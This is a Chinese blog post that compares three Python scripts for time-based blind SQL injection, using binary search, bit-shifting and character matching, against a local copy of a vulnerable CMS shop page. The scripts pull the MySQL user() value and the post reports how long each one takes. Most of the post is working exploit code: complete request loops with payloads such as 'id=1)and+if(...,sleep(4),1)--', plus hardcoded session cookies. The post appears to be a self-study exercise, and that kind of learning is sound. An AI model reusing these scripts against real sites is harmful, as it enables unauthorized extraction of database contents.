---
layout:	post
title:	"SQL注入-失了智的盲注尝试"
date:	2020-06-05 15:10:09 +0800
tags:	SQL注入
color:	rgb(122,103,138)
cover:	'../assets/blog_pic/20200605_stupid_sqli_blind/cover.png'
subtitle:	'Time Based With Python'

---

* 目录
{:toc}
这两天套娃网上的教程，实现了一下盲注脚本，在寻觅的过程中，看到一个[使用MySQL位函数和运算符进行基于时间的高效SQL盲注](https://www.freebuf.com/articles/web/188029.html)，使用“右移”运算符(>>)，枚举从SQL查询返回值的二进制位

高效厚，高效吗？俺来试一试



# 测试环境

测试环境是一个cms的sql注入漏洞，来源我就不说了，这里的sql注入就是没有过滤，但是是POST提交的方式，然后我改成了GET的方式，如果是POST的话，就是加一个data={}哈哈哈

这里木有加多线程进去，高速公路上比一比



# 二分の盲注

二分法就是，把一个顺序的区间分为两半，取中间的数，目标大于中间的数就舍弃前半段，目标小于中间的数就舍弃后半段。我这里给的区间是30-150，我先按照我的理解，写了一下二分法盲注：

```
#二分法
import requests
import datetime
import time

headers={
'Host': '127.0.0.1',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36',
'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
'Accept-Encoding': 'gzip, deflate',
'X-Requested-With': 'XMLHttpRequest',
'Origin': 'http://127.0.0.1',
'Connection': 'close',
'Referer': 'http://127.0.0.1/goods/1.html',
'Cookie': 'UM_distinctid=1720c8e9f960-0fd572df9b95ed-374c2c08-15f900-1720c8e9f9a7; CNZZDATA1277972876=1114558-1589348573-%7C1589953788; PHPSESSID=hp0i4j6to52gg338ven8c69k8k'
}

def blind(k,i):
	realurl = '''http://127.0.0.1/shop/tijiao.html'''
	payload = '''?guige=s&shuliang=1&id=1)and+if(ord(substr(user(),%d,1))>=%d,sleep(4),1)--''' % (k,i)
	url = realurl + payload
	time1 = datetime.datetime.now()
	r = requests.get(url=url,headers=headers)
	time2 = datetime.datetime.now()
	sec = (time2 - time1).seconds
	return sec

def user_name():
	name = ''
	for k in range(1,15):#长度
		mini=30
		maxi=150
		midi= mini+(maxi-mini)//2

		for j in range(1,8):
			if(blind(k,midi)<3):
				maxi = midi
				midi = mini+((midi-mini)//2)
			else:
				mini = midi
				midi = mini+((maxi-midi)//2)
		name += chr(midi)
		print('user_name:',name)
		
user_name()
```

用户名root@loacalhost，用时**241.9s**



# 左移の盲注

**r**的ascii码是114，变二进制是**0111 0010**，分别左移7位、6位看一下

```
mysql> select 114>>7;
+--------+
| 114>>7 |
+--------+
|      0 |
+--------+
1 row in set (0.00 sec)

mysql> select 114>>6;
+--------+
| 114>>6 |
+--------+
|      1 |
+--------+
1 row in set (0.00 sec)
```

字符串的第一位都是0，所以我们只需要核对后七位，也就是从左移6开始

然后按照我的理解，写了一下逐位左移的盲注，感觉写的好傻 啊，已经好久没写代码了，属于头一天写第二天就看不懂那种：

```
import requests
import datetime
import time

headers={
'Host': '127.0.0.1',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36',
'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
'Accept-Encoding': 'gzip, deflate',
'X-Requested-With': 'XMLHttpRequest',
'Origin': 'http://127.0.0.1',
'Connection': 'close',
'Referer': 'http://127.0.0.1/goods/1.html',
'Cookie': 'UM_distinctid=1720c8e9f960-0fd572df9b95ed-374c2c08-15f900-1720c8e9f9a7; CNZZDATA1277972876=1114558-1589348573-%7C1589953788; PHPSESSID=hp0i4j6to52gg338ven8c69k8k'
}

def blind(k,i,j):
	realurl = '''http://127.0.0.1/shop/tijiao.html'''
	payload = '''?guige=s&shuliang=1&id=1)and+if((ascii((substr(user(),%d,1)))+>>+%d)=%d,sleep(4),1)--''' % (k,i,j)
	url = realurl + payload
	time1 = datetime.datetime.now()
	r = requests.get(url=url,headers=headers)
	time2 = datetime.datetime.now()
	sec = (time2 - time1).seconds
	return sec

def user_name():
	name = ''
	for k in range(1,15):
		j = 1
		for i in range(6,-1,-1):
			if((j%2)==0):
				j += 1
			time_blind=blind(k,i,j)
			if (time_blind>1):
				if(i == 0):
					name += chr(j)
					break
				else:
					j = j * 2 + 1
			else:
				if(i == 0):
					name += chr(j - 1)
					break
				else:
					j = (j - 1) * 2
		print('user_name:',name)

user_name()
```

用户名root@loacalhost，用时**247s**(ˉ﹃ˉ)

# 小小の总结

🔥为了公平起见，两个延时都是sleep(4)

🔥二分241.9左移247用时差不多，因为二分法是每次除以2，二进制中左移其实也是2倍计算

🔥如果你确定盲注的目标的字符范围，其实有更快的方法，如下



# 匹配の盲注

先要有一个列表，这里我把我能用到的放了进去，数字，大小写字母，和一个@，然后逐个匹配，如果匹配到了就是他了

```
import requests
import datetime
import time

headers={
'Host': '127.0.0.1',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36',
'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
'Accept-Encoding': 'gzip, deflate',
'X-Requested-With': 'XMLHttpRequest',
'Origin': 'http://127.0.0.1',
'Connection': 'close',
'Referer': 'http://127.0.0.1/goods/1.html',
'Cookie': 'UM_distinctid=1720c8e9f960-0fd572df9b95ed-374c2c08-15f900-1720c8e9f9a7; CNZZDATA1277972876=1114558-1589348573-%7C1589953788; PHPSESSID=hp0i4j6to52gg338ven8c69k8k'
}

def user_name():
	name = ''
	for i in range(1,15):
		for j in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@':
			realurl = '''http://127.0.0.1/shop/tijiao.html'''
			payload = '''?guige=s&shuliang=1&id=1)and+if(substr(user(),%d,1)='%s',sleep(4),1)--''' % (i,j)
			url = realurl + payload

			time1 = datetime.datetime.now()
			r = requests.get(url=url,headers=headers)
			time2 = datetime.datetime.now()

			sec = (time2 - time1).seconds
			if sec >= 3:
				name += j
				break
		print('user_name:',name)

user_name()
```

用户名root@loacalhost，用时**76.8s**不香吗(。・∀・)ノ

ps：但如果你的列表里漏了一些特殊字符，那就漏了，所以还是二分和左移比较靠谱全面





# Refer

[https://www.freebuf.com/articles/web/188029.html](fuzhi)

[https://www.freebuf.com/articles/web/231741.html](zhantie)